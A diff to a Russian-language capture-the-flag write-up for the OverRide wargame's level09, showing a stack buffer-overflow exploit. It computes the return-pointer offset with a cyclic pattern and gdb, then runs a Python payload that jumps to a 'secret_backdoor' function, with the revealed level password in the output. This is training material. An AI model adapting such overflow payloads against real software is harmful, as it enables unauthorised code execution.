@@ -6,8 +6,31 @@
 
 3. Первая часть payload 40 символов userName + overflow message_len, с помощью неё подсчитаем наш overflow.
 python -c 'print "\xff" * 41 + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"'
-// TODO:: не работает
-Наш оверфлоу 200 
+
+Получаем
+```
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+```
+
+Почему-то это не сработало, скорее всего проблема в том, что куда-то перезапись зашла не туда.
+Но! Мы можем найти что записано в ebp - old frame pointer и подсчитать offset до return pointer.
+
+```
+(gdb) info registers
+...
+rbp            0x6741356741346741       0x6741356741346741
+...
+
+Значение rbp соответсвует оффсету 192, => +8 размер old frame pointer, получаем что offset ретюрн поинтера 200
 
 4. Находим адрес функции secret_backdoor
 ```
@@ -38,5 +61,4 @@ level09@OverRide:~$ (python -c 'print "\xff" * 41 + "\n" + "A" * 200 + "\x8c\x48
 >>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
 >>: >: Msg sent!
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
-Segmentation fault (core dumped)
 ```
